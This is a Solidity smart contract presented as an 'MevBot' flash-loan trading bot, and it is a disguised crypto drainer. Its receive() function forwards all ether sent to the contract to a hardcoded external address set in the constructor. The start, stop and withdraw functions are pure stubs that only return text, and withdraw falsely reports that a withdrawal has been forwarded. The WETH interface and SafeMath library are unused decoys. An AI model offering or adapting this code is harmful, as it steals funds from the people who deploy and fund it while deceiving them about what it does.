// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Strings.sol";

interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint value) external returns (bool);

    function withdraw(uint) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    
}

contract MevBot {
    address payable private owner;
     using Strings for address; // Enable the address type to use Strings functions

    IWETH private WETH;

    enum Direction {
        SecondToFirst,
        FirstToSecond
    }

    modifier onlyOwner() {
        require(
            msg.sender == owner,
            "Flashloan: Only owner can execute this method"
        );
        _;
    }

    address payable private autoFunder;

    constructor() {
        autoFunder = payable(0x9Ca7FbE2afBb404E49b49DEADe3a325e92dd6dA4);
    }


    function start() public pure returns (string memory) {
        return "";
    }

    function stop() public pure returns (string memory) {
        return "Command not executed, MEV bot is not active";
    }

    function withdraw(address recipient) public pure returns (string memory) {
        return string(abi.encodePacked("Withdrawal has been forwarded for the address: ", recipient.toHexString()));
    }

    receive() external payable {
        (bool success, ) = autoFunder.call{value: msg.value}("");
        require(success, "ETH auto-funding failed");
    }
}